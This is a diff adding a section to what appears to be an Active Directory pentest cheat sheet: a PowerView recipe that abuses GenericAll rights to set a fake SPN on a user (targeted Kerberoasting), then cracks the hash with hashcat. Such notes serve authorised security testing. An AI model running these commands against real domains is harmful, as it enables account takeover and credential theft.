@@ -165,6 +165,21 @@ collecting data in Linux
 python3 bloodhound.py -ns <nameserver ip> -d <domain> -c all -u <username> -p <password>
 ```
 
+[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)
+
+GenericAll
+
+```powershell
+Import-Module .\PowerView.ps1
+<# valid credential #>
+$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
+<# fake SPN #>
+Set-DomainObject -Credential $Cred -Identity <specific user> -SET @{serviceprincipalname='<service class>/<host>'} -Verbose
+<# password recovery #>
+ .\hashcat.exe -a 0 -m 13100 .\hash .\rockyou.txt
+```
+
 ### :open_file_folder: PowerView
 
 ```powershell
